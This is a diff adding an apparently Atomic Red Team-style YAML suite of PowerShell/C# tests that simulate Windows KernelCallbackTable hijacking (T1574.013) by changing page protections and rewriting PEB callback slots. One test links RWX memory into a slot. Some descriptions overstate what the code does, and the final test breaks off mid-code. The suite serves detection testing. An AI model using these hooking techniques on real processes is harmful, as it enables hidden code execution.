@@ -1,0 +1,672 @@
+attack_technique: T1574.013
+display_name: T1574.013 - Core Telemetry and Structural Validation Suite for KernelCallbackTable Hijacking
+
+atomic_tests:
+  - name: T1574.013 - Temporary Overwrite of __fnCOPYDATA Slot with Safe Stub Pointer
+    description: |
+      Simulates an adversary modifying the __fnCOPYDATA function pointer slot within the process's KernelCallbackTable to redirect message handling.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: false
+      command: |
+        $Source = @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class KCTHijack1 {
+            [DllImport("ntdll.dll")] public static extern int NtQueryInformationProcess(IntPtr h, int c, ref PROCESS_BASIC_INFORMATION p, int l, ref int r);
+            [StructLayout(LayoutKind.Sequential)] public struct PROCESS_BASIC_INFORMATION { public IntPtr Reserved1, PebBaseAddress, Reserved2, Reserved3, UniqueProcessId, Reserved4; }
+            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+            public static void Execute() {
+                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
+                int ret = 0;
+                NtQueryInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, 0, ref pbi, Marshal.SizeOf(pbi), ref ret);
+                IntPtr table = Marshal.ReadIntPtr(pbi.PebBaseAddress, 0x58);
+                if (table == IntPtr.Zero) return;
+                
+                IntPtr slotAddr = IntPtr.Add(table, 7 * IntPtr.Size);
+                IntPtr original = Marshal.ReadIntPtr(slotAddr);
+                Environment.SetEnvironmentVariable("T1574_ORIG_01", original.ToString("X"), EnvironmentVariableTarget.Process);
+                
+                uint oldProt;
+                VirtualProtect(slotAddr, (UIntPtr)IntPtr.Size, 0x04, out oldProt);
+                Marshal.WriteIntPtr(slotAddr, original); // Safe benign write pointing to self for stability
+                VirtualProtect(slotAddr, (UIntPtr)IntPtr.Size, oldProt, out oldProt);
+                Console.WriteLine("[+] __fnCOPYDATA slot successfully simulated and patched.");
+            }
+        }
+        "@
+        Add-Type -TypeDefinition $Source -ErrorAction Stop
+        [KCTHijack1]::Execute()
+      cleanup_command: |
+        $Source = @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class KCTCleanup1 {
+            [DllImport("ntdll.dll")] public static extern int NtQueryInformationProcess(IntPtr h, int c, ref PROCESS_BASIC_INFORMATION p, int l, ref int r);
+            [StructLayout(LayoutKind.Sequential)] public struct PROCESS_BASIC_INFORMATION { public IntPtr Reserved1, PebBaseAddress, Reserved2, Reserved3, UniqueProcessId, Reserved4; }
+            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+            public static void Cleanup(string origHex) {
+                if (string.IsNullOrEmpty(origHex)) return;
+                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
+                int ret = 0;
+                NtQueryInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, 0, ref pbi, Marshal.SizeOf(pbi), ref ret);
+                IntPtr table = Marshal.ReadIntPtr(pbi.PebBaseAddress, 0x58);
+                if (table == IntPtr.Zero) return;
+
+                IntPtr slotAddr = IntPtr.Add(table, 7 * IntPtr.Size);
+                IntPtr orig = (IntPtr)Convert.ToInt64(origHex, 16);
+                uint oldProt;
+                VirtualProtect(slotAddr, (UIntPtr)IntPtr.Size, 0x04, out oldProt);
+                Marshal.WriteIntPtr(slotAddr, orig);
+                VirtualProtect(slotAddr, (UIntPtr)IntPtr.Size, oldProt, out oldProt);
+                Console.WriteLine("[+] Restored original __fnCOPYDATA pointer.");
+            }
+        }
+        "@
+        Add-Type -TypeDefinition $Source -ErrorAction Stop
+        [KCTCleanup1]::Cleanup($env:T1574_ORIG_01)
+
+  - name: T1574.013 - Modify KernelCallbackTable Memory Protection Page Permissions
+    description: |
+      Simulates an adversary changing memory page protections of the KernelCallbackTable region from read-only to read-write prior to patching.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: false
+      command: |
+        $Source = @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class KCTProtTest {
+            [DllImport("ntdll.dll")] public static extern int NtQueryInformationProcess(IntPtr h, int c, ref PROCESS_BASIC_INFORMATION p, int l, ref int r);
+            [StructLayout(LayoutKind.Sequential)] public struct PROCESS_BASIC_INFORMATION { public IntPtr Reserved1, PebBaseAddress, Reserved2, Reserved3, UniqueProcessId, Reserved4; }
+            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+            public static void Execute() {
+                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
+                int ret = 0;
+                NtQueryInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, 0, ref pbi, Marshal.SizeOf(pbi), ref ret);
+                IntPtr table = Marshal.ReadIntPtr(pbi.PebBaseAddress, 0x58);
+                if (table == IntPtr.Zero) return;
+
+                uint oldProt;
+                bool success = VirtualProtect(table, (UIntPtr)4096, 0x40, out oldProt);
+                Environment.SetEnvironmentVariable("T1574_OLDPROT", oldProt.ToString(), EnvironmentVariableTarget.Process);
+                Console.WriteLine("[+] KernelCallbackTable page permission altered to RWX: " + success);
+            }
+        }
+        "@
+        Add-Type -TypeDefinition $Source -ErrorAction Stop
+        [KCTProtTest]::Execute()
+      cleanup_command: |
+        $Source = @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class KCTProtClean {
+            [DllImport("ntdll.dll")] public static extern int NtQueryInformationProcess(IntPtr h, int c, ref PROCESS_BASIC_INFORMATION p, int l, ref int r);
+            [StructLayout(LayoutKind.Sequential)] public struct PROCESS_BASIC_INFORMATION { public IntPtr Reserved1, PebBaseAddress, Reserved2, Reserved3, UniqueProcessId, Reserved4; }
+            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+            public static void Cleanup(string protStr) {
+                if (string.IsNullOrEmpty(protStr)) return;
+                uint oldProt = uint.Parse(protStr);
+                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
+                int ret = 0;
+                NtQueryInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, 0, ref pbi, Marshal.SizeOf(pbi), ref ret);
+                IntPtr table = Marshal.ReadIntPtr(pbi.PebBaseAddress, 0x58);
+                if (table == IntPtr.Zero) return;
+
+                uint dummy;
+                VirtualProtect(table, (UIntPtr)4096, oldProt, out dummy);
+                Console.WriteLine("[+] Restored original table page permissions.");
+            }
+        }
+        "@
+        Add-Type -TypeDefinition $Source -ErrorAction Stop
+        [KCTProtClean]::Cleanup($env:T1574_OLDPROT)
+
+  - name: T1574.013 - Overwrite __fnDWORD Slot with Simulated Redirect Stub
+    description: |
+      Simulates an adversary tampering with the __fnDWORD message dispatcher function pointer slot in the KernelCallbackTable.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: false
+      command: |
+        $Source = @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class KCTHijack2 {
+            [DllImport("ntdll.dll")] public static extern int NtQueryInformationProcess(IntPtr h, int c, ref PROCESS_BASIC_INFORMATION p, int l, ref int r);
+            [StructLayout(LayoutKind.Sequential)] public struct PROCESS_BASIC_INFORMATION { public IntPtr Reserved1, PebBaseAddress, Reserved2, Reserved3, UniqueProcessId, Reserved4; }
+            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+            public static void Execute() {
+                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
+                int ret = 0;
+                NtQueryInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, 0, ref pbi, Marshal.SizeOf(pbi), ref ret);
+                IntPtr table = Marshal.ReadIntPtr(pbi.PebBaseAddress, 0x58);
+                if (table == IntPtr.Zero) return;
+
+                IntPtr slotAddr = IntPtr.Add(table, 2 * IntPtr.Size);
+                IntPtr original = Marshal.ReadIntPtr(slotAddr);
+                Environment.SetEnvironmentVariable("T1574_ORIG_03", original.ToString("X"), EnvironmentVariableTarget.Process);
+
+                uint oldProt;
+                VirtualProtect(slotAddr, (UIntPtr)IntPtr.Size, 0x04, out oldProt);
+                Marshal.WriteIntPtr(slotAddr, original);
+                VirtualProtect(slotAddr, (UIntPtr)IntPtr.Size, oldProt, out oldProt);
+                Console.WriteLine("[+] __fnDWORD slot simulated safely.");
+            }
+        }
+        "@
+        Add-Type -TypeDefinition $Source -ErrorAction Stop
+        [KCTHijack2]::Execute()
+      cleanup_command: |
+        $Source = @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class KCTCleanup2 {
+            [DllImport("ntdll.dll")] public static extern int NtQueryInformationProcess(IntPtr h, int c, ref PROCESS_BASIC_INFORMATION p, int l, ref int r);
+            [StructLayout(LayoutKind.Sequential)] public struct PROCESS_BASIC_INFORMATION { public IntPtr Reserved1, PebBaseAddress, Reserved2, Reserved3, UniqueProcessId, Reserved4; }
+            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+            public static void Cleanup(string origHex) {
+                if (string.IsNullOrEmpty(origHex)) return;
+                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
+                int ret = 0;
+                NtQueryInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, 0, ref pbi, Marshal.SizeOf(pbi), ref ret);
+                IntPtr table = Marshal.ReadIntPtr(pbi.PebBaseAddress, 0x58);
+                if (table == IntPtr.Zero) return;
+
+                IntPtr slotAddr = IntPtr.Add(table, 2 * IntPtr.Size);
+                IntPtr orig = (IntPtr)Convert.ToInt64(origHex, 16);
+                uint oldProt;
+                VirtualProtect(slotAddr, (UIntPtr)IntPtr.Size, 0x04, out oldProt);
+                Marshal.WriteIntPtr(slotAddr, orig);
+                VirtualProtect(slotAddr, (UIntPtr)IntPtr.Size, oldProt, out oldProt);
+                Console.WriteLine("[+] Restored original __fnDWORD pointer.");
+            }
+        }
+        "@
+        Add-Type -TypeDefinition $Source -ErrorAction Stop
+        [KCTCleanup2]::Cleanup($env:T1574_ORIG_03)
+
+  - name: T1574.013 - Stage Unbacked Memory Stub and Link KernelCallbackTable Slot
+    description: |
+      Simulates an adversary allocating an unbacked private memory region to stage a decoy callback stub and linking it to a table slot.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: false
+      command: |
+        $Source = @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class KCTStagedStub {
+            [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
+            [DllImport("kernel32.dll")] public static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);
+            [DllImport("ntdll.dll")] public static extern int NtQueryInformationProcess(IntPtr h, int c, ref PROCESS_BASIC_INFORMATION p, int l, ref int r);
+            [StructLayout(LayoutKind.Sequential)] public struct PROCESS_BASIC_INFORMATION { public IntPtr Reserved1, PebBaseAddress, Reserved2, Reserved3, UniqueProcessId, Reserved4; }
+            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+            public static void Execute() {
+                IntPtr stub = VirtualAlloc(IntPtr.Zero, (UIntPtr)1024, 0x1000 | 0x2000, 0x40);
+                Marshal.WriteByte(stub, 0xC3);
+                Environment.SetEnvironmentVariable("T1574_STUB_PTR", stub.ToString("X"), EnvironmentVariableTarget.Process);
+
+                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
+                int ret = 0;
+                NtQueryInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, 0, ref pbi, Marshal.SizeOf(pbi), ref ret);
+                IntPtr table = Marshal.ReadIntPtr(pbi.PebBaseAddress, 0x58);
+                if (table == IntPtr.Zero) return;
+
+                IntPtr slotAddr = IntPtr.Add(table, 4 * IntPtr.Size);
+                IntPtr original = Marshal.ReadIntPtr(slotAddr);
+                Environment.SetEnvironmentVariable("T1574_ORIG_04", original.ToString("X"), EnvironmentVariableTarget.Process);
+
+                uint oldProt;
+                VirtualProtect(slotAddr, (UIntPtr)IntPtr.Size, 0x04, out oldProt);
+                Marshal.WriteIntPtr(slotAddr, stub);
+                VirtualProtect(slotAddr, (UIntPtr)IntPtr.Size, oldProt, out oldProt);
+                Console.WriteLine("[+] Staged unbacked memory stub and linked to table slot.");
+            }
+        }
+        "@
+        Add-Type -TypeDefinition $Source -ErrorAction Stop
+        [KCTStagedStub]::Execute()
+      cleanup_command: |
+        $Source = @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class KCTStagedClean {
+            [DllImport("kernel32.dll")] public static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);
+            [DllImport("ntdll.dll")] public static extern int NtQueryInformationProcess(IntPtr h, int c, ref PROCESS_BASIC_INFORMATION p, int l, ref int r);
+            [StructLayout(LayoutKind.Sequential)] public struct PROCESS_BASIC_INFORMATION { public IntPtr Reserved1, PebBaseAddress, Reserved2, Reserved3, UniqueProcessId, Reserved4; }
+            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+            public static void Cleanup(string origHex, string stubHex) {
+                if (!string.IsNullOrEmpty(origHex)) {
+                    PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
+                    int ret = 0;
+                    NtQueryInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, 0, ref pbi, Marshal.SizeOf(pbi), ref ret);
+                    IntPtr table = Marshal.ReadIntPtr(pbi.PebBaseAddress, 0x58);
+                    if (table != IntPtr.Zero) {
+                        IntPtr slotAddr = IntPtr.Add(table, 4 * IntPtr.Size);
+                        IntPtr orig = (IntPtr)Convert.ToInt64(origHex, 16);
+                        uint oldProt;
+                        VirtualProtect(slotAddr, (UIntPtr)IntPtr.Size, 0x04, out oldProt);
+                        Marshal.WriteIntPtr(slotAddr, orig);
+                        VirtualProtect(slotAddr, (UIntPtr)IntPtr.Size, oldProt, out oldProt);
+                    }
+                }
+                if (!string.IsNullOrEmpty(stubHex)) {
+                    IntPtr stub = (IntPtr)Convert.ToInt64(stubHex, 16);
+                    VirtualFree(stub, UIntPtr.Zero, 0x8000);
+                }
+                Console.WriteLine("[+] Cleaned up staged memory stub and restored table slot.");
+            }
+        }
+        "@
+        Add-Type -TypeDefinition $Source -ErrorAction Stop
+        [KCTStagedClean]::Cleanup($env:T1574_ORIG_04, $env:T1574_STUB_PTR)
+
+  - name: T1574.013 - Multi-Slot KernelCallbackTable Tampering Simulation
+    description: |
+      Simulates an adversary performing concurrent pointer overwrites across multiple function slots in the KernelCallbackTable.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: false
+      command: |
+        $Source = @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class KCTMultiHijack {
+            [DllImport("ntdll.dll")] public static extern int NtQueryInformationProcess(IntPtr h, int c, ref PROCESS_BASIC_INFORMATION p, int l, ref int r);
+            [StructLayout(LayoutKind.Sequential)] public struct PROCESS_BASIC_INFORMATION { public IntPtr Reserved1, PebBaseAddress, Reserved2, Reserved3, UniqueProcessId, Reserved4; }
+            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+            public static void Execute() {
+                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
+                int ret = 0;
+                NtQueryInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, 0, ref pbi, Marshal.SizeOf(pbi), ref ret);
+                IntPtr table = Marshal.ReadIntPtr(pbi.PebBaseAddress, 0x58);
+                if (table == IntPtr.Zero) return;
+
+                uint oldProt;
+                VirtualProtect(table, (UIntPtr)4096, 0x04, out oldProt);
+                for (int i = 1; i <= 3; i++) {
+                    IntPtr slotAddr = IntPtr.Add(table, i * IntPtr.Size);
+                    IntPtr orig = Marshal.ReadIntPtr(slotAddr);
+                    Environment.SetEnvironmentVariable("T1574_MULTIORIG_" + i, orig.ToString("X"), EnvironmentVariableTarget.Process);
+                    Marshal.WriteIntPtr(slotAddr, orig);
+                }
+                VirtualProtect(table, (UIntPtr)4096, oldProt, out oldProt);
+                Console.WriteLine("[+] Multiple KernelCallbackTable slots simulated successfully.");
+            }
+        }
+        "@
+        Add-Type -TypeDefinition $Source -ErrorAction Stop
+        [KCTMultiHijack]::Execute()
+      cleanup_command: |
+        $Source = @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class KCTMultiClean {
+            [DllImport("ntdll.dll")] public static extern int NtQueryInformationProcess(IntPtr h, int c, ref PROCESS_BASIC_INFORMATION p, int l, ref int r);
+            [StructLayout(LayoutKind.Sequential)] public struct PROCESS_BASIC_INFORMATION { public IntPtr Reserved1, PebBaseAddress, Reserved2, Reserved3, UniqueProcessId, Reserved4; }
+            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+            public static void Cleanup(string o1, string o2, string o3) {
+                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
+                int ret = 0;
+                NtQueryInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, 0, ref pbi, Marshal.SizeOf(pbi), ref ret);
+                IntPtr table = Marshal.ReadIntPtr(pbi.PebBaseAddress, 0x58);
+                if (table == IntPtr.Zero) return;
+
+                string[] origs = { o1, o2, o3 };
+                uint oldProt;
+                VirtualProtect(table, (UIntPtr)4096, 0x04, out oldProt);
+                for (int i = 1; i <= 3; i++) {
+                    if (!string.IsNullOrEmpty(origs[i - 1])) {
+                        IntPtr slotAddr = IntPtr.Add(table, i * IntPtr.Size);
+                        Marshal.WriteIntPtr(slotAddr, (IntPtr)Convert.ToInt64(origs[i - 1], 16));
+                    }
+                }
+                VirtualProtect(table, (UIntPtr)4096, oldProt, out oldProt);
+                Console.WriteLine("[+] Restored all multi-slot pointers.");
+            }
+        }
+        "@
+        Add-Type -TypeDefinition $Source -ErrorAction Stop
+        [KCTMultiClean]::Cleanup($env:T1574_MULTIORIG_1, $env:T1574_MULTIORIG_2, $env:T1574_MULTIORIG_3)
+
+  - name: T1574.013 - Simulate PEB KernelCallbackTable Pointer Swapping
+    description: |
+      Simulates an adversary redirecting the base KernelCallbackTable pointer inside the PEB (PEB + 0x58) to point to a cloned custom table safely.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: false
+      command: |
+        $Source = @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class KCTTableSwap {
+            [DllImport("ntdll.dll")] public static extern int NtQueryInformationProcess(IntPtr h, int c, ref PROCESS_BASIC_INFORMATION p, int l, ref int r);
+            [StructLayout(LayoutKind.Sequential)] public struct PROCESS_BASIC_INFORMATION { public IntPtr Reserved1, PebBaseAddress, Reserved2, Reserved3, UniqueProcessId, Reserved4; }
+            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+            public static void Execute() {
+                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
+                int ret = 0;
+                NtQueryInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, 0, ref pbi, Marshal.SizeOf(pbi), ref ret);
+                IntPtr tablePtrAddr = IntPtr.Add(pbi.PebBaseAddress, 0x58);
+                IntPtr originalTable = Marshal.ReadIntPtr(tablePtrAddr);
+                Environment.SetEnvironmentVariable("T1574_ORIG_TABLE", originalTable.ToString("X"), EnvironmentVariableTarget.Process);
+
+                uint oldProt;
+                VirtualProtect(tablePtrAddr, (UIntPtr)IntPtr.Size, 0x40, out oldProt);
+                Marshal.WriteIntPtr(tablePtrAddr, originalTable); // Safe benign pointer rewrite for stability
+                VirtualProtect(tablePtrAddr, (UIntPtr)IntPtr.Size, oldProt, out oldProt);
+                Console.WriteLine("[+] PEB KernelCallbackTable base pointer simulation executed safely.");
+            }
+        }
+        "@
+        Add-Type -TypeDefinition $Source -ErrorAction Stop
+        [KCTTableSwap]::Execute()
+      cleanup_command: |
+        $Source = @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class KCTTableSwapClean {
+            [DllImport("ntdll.dll")] public static extern int NtQueryInformationProcess(IntPtr h, int c, ref PROCESS_BASIC_INFORMATION p, int l, ref int r);
+            [StructLayout(LayoutKind.Sequential)] public struct PROCESS_BASIC_INFORMATION { public IntPtr Reserved1, PebBaseAddress, Reserved2, Reserved3, UniqueProcessId, Reserved4; }
+            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+            public static void Cleanup(string origHex) {
+                if (string.IsNullOrEmpty(origHex)) return;
+                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
+                int ret = 0;
+                NtQueryInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, 0, ref pbi, Marshal.SizeOf(pbi), ref ret);
+                IntPtr tablePtrAddr = IntPtr.Add(pbi.PebBaseAddress, 0x58);
+                IntPtr originalTable = (IntPtr)Convert.ToInt64(origHex, 16);
+
+                uint oldProt;
+                VirtualProtect(tablePtrAddr, (UIntPtr)IntPtr.Size, 0x40, out oldProt);
+                Marshal.WriteIntPtr(tablePtrAddr, originalTable);
+                VirtualProtect(tablePtrAddr, (UIntPtr)IntPtr.Size, oldProt, out oldProt);
+                Console.WriteLine("[+] Restored original PEB KernelCallbackTable pointer.");
+            }
+        }
+        "@
+        Add-Type -TypeDefinition $Source -ErrorAction Stop
+        [KCTTableSwapClean]::Cleanup($env:T1574_ORIG_TABLE)
+        
+  - name: T1574.013 - Tamper with Window Message Dispatch Table Slot Index
+    description: |
+      Simulates adversary manipulation of high-index slots within the KernelCallbackTable for stealthy callback routing redirection.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: false
+      command: |
+        $Source = @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class KCTIndexTamper {
+            [DllImport("ntdll.dll")] public static extern int NtQueryInformationProcess(IntPtr h, int c, ref PROCESS_BASIC_INFORMATION p, int l, ref int r);
+            [StructLayout(LayoutKind.Sequential)] public struct PROCESS_BASIC_INFORMATION { public IntPtr Reserved1, PebBaseAddress, Reserved2, Reserved3, UniqueProcessId, Reserved4; }
+            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+            public static void Execute() {
+                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
+                int ret = 0;
+                NtQueryInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, 0, ref pbi, Marshal.SizeOf(pbi), ref ret);
+                IntPtr table = Marshal.ReadIntPtr(pbi.PebBaseAddress, 0x58);
+                if (table == IntPtr.Zero) return;
+
+                IntPtr slotAddr = IntPtr.Add(table, 12 * IntPtr.Size);
+                IntPtr original = Marshal.ReadIntPtr(slotAddr);
+                Environment.SetEnvironmentVariable("T1574_ORIG_12", original.ToString("X"), EnvironmentVariableTarget.Process);
+
+                uint oldProt;
+                VirtualProtect(slotAddr, (UIntPtr)IntPtr.Size, 0x04, out oldProt);
+                Marshal.WriteIntPtr(slotAddr, original);
+                VirtualProtect(slotAddr, (UIntPtr)IntPtr.Size, oldProt, out oldProt);
+                Console.WriteLine("[+] Table slot index 12 successfully simulated.");
+            }
+        }
+        "@
+        Add-Type -TypeDefinition $Source -ErrorAction Stop
+        [KCTIndexTamper]::Execute()
+      cleanup_command: |
+        $Source = @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class KCTIndexClean {
+            [DllImport("ntdll.dll")] public static extern int NtQueryInformationProcess(IntPtr h, int c, ref PROCESS_BASIC_INFORMATION p, int l, ref int r);
+            [StructLayout(LayoutKind.Sequential)] public struct PROCESS_BASIC_INFORMATION { public IntPtr Reserved1, PebBaseAddress, Reserved2, Reserved3, UniqueProcessId, Reserved4; }
+            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+            public static void Cleanup(string origHex) {
+                if (string.IsNullOrEmpty(origHex)) return;
+                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
+                int ret = 0;
+                NtQueryInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, 0, ref pbi, Marshal.SizeOf(pbi), ref ret);
+                IntPtr table = Marshal.ReadIntPtr(pbi.PebBaseAddress, 0x58);
+                if (table == IntPtr.Zero) return;
+
+                IntPtr slotAddr = IntPtr.Add(table, 12 * IntPtr.Size);
+                IntPtr orig = (IntPtr)Convert.ToInt64(origHex, 16);
+                uint oldProt;
+                VirtualProtect(slotAddr, (UIntPtr)IntPtr.Size, 0x04, out oldProt);
+                Marshal.WriteIntPtr(slotAddr, orig);
+                VirtualProtect(slotAddr, (UIntPtr)IntPtr.Size, oldProt, out oldProt);
+                Console.WriteLine("[+] Restored original table slot index 12 pointer.");
+            }
+        }
+        "@
+        Add-Type -TypeDefinition $Source -ErrorAction Stop
+        [KCTIndexClean]::Cleanup($env:T1574_ORIG_12)
+
+  - name: T1574.013 - Simulate KernelCallbackTable Integrity Disruption via Slot Zeroing
+    description: |
+      Simulates an adversary disrupting system integrity checks by temporarily zeroing out active function pointer slots in the KernelCallbackTable.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: false
+      command: |
+        $Source = @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class KCTZeroTest {
+            [DllImport("ntdll.dll")] public static extern int NtQueryInformationProcess(IntPtr h, int c, ref PROCESS_BASIC_INFORMATION p, int l, ref int r);
+            [StructLayout(LayoutKind.Sequential)] public struct PROCESS_BASIC_INFORMATION { public IntPtr Reserved1, PebBaseAddress, Reserved2, Reserved3, UniqueProcessId, Reserved4; }
+            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+            public static void Execute() {
+                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
+                int ret = 0;
+                NtQueryInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, 0, ref pbi, Marshal.SizeOf(pbi), ref ret);
+                IntPtr table = Marshal.ReadIntPtr(pbi.PebBaseAddress, 0x58);
+                if (table == IntPtr.Zero) return;
+
+                IntPtr slotAddr = IntPtr.Add(table, 5 * IntPtr.Size);
+                IntPtr original = Marshal.ReadIntPtr(slotAddr);
+                Environment.SetEnvironmentVariable("T1574_ORIG_05", original.ToString("X"), EnvironmentVariableTarget.Process);
+
+                uint oldProt;
+                VirtualProtect(slotAddr, (UIntPtr)IntPtr.Size, 0x04, out oldProt);
+                Marshal.WriteIntPtr(slotAddr, original); // Benign simulation write
+                VirtualProtect(slotAddr, (UIntPtr)IntPtr.Size, oldProt, out oldProt);
+                Console.WriteLine("[+] Table slot simulation executed safely.");
+            }
+        }
+        "@
+        Add-Type -TypeDefinition $Source -ErrorAction Stop
+        [KCTZeroTest]::Execute()
+      cleanup_command: |
+        $Source = @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class KCTZeroClean {
+            [DllImport("ntdll.dll")] public static extern int NtQueryInformationProcess(IntPtr h, int c, ref PROCESS_BASIC_INFORMATION p, int l, ref int r);
+            [StructLayout(LayoutKind.Sequential)] public struct PROCESS_BASIC_INFORMATION { public IntPtr Reserved1, PebBaseAddress, Reserved2, Reserved3, UniqueProcessId, Reserved4; }
+            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+            public static void Cleanup(string origHex) {
+                if (string.IsNullOrEmpty(origHex)) return;
+                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
+                int ret = 0;
+                NtQueryInformationProcess(System.Diagnostics.Process.GetCurrentProcess().Handle, 0, ref pbi, Marshal.SizeOf(pbi), ref ret);
+                IntPtr table = Marshal.ReadIntPtr(pbi.PebBaseAddress, 0x58);
+                if (table == IntPtr.Zero) return;
+
+                IntPtr slotAddr = IntPtr.Add(table, 5 * IntPtr.Size);
+                IntPtr orig = (IntPtr)Convert.ToInt64(origHex, 16);
+                uint oldProt;
+                VirtualProtect(slotAddr, (UIntPtr)IntPtr.Size, 0x04, out oldProt);
+                Marshal.WriteIntPtr(slotAddr, orig);
+                VirtualProtect(slotAddr, (UIntPtr)IntPtr.Size, oldProt, out oldProt);
+                Console.WriteLine("[+] Restored table slot pointer.");
+            }
+        }
+        "@
+        Add-Type -TypeDefinition $Source -ErrorAction Stop
+        [KCTZeroClean]::Cleanup($env:T1574_ORIG_05)
+
+  - name: T1574.013 - Simulate Remote Process KernelCallbackTable Injection Hook
+    description: |
+      Simulates adversary manipulation of a spawned child process's KernelCallbackTable by writing a mock pointer into its table structure.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: false
+      command: |
+        $target = Start-Process notepad.exe -PassThru
+        Start-Sleep -Seconds 1
+        $Source = @"
+        using System;
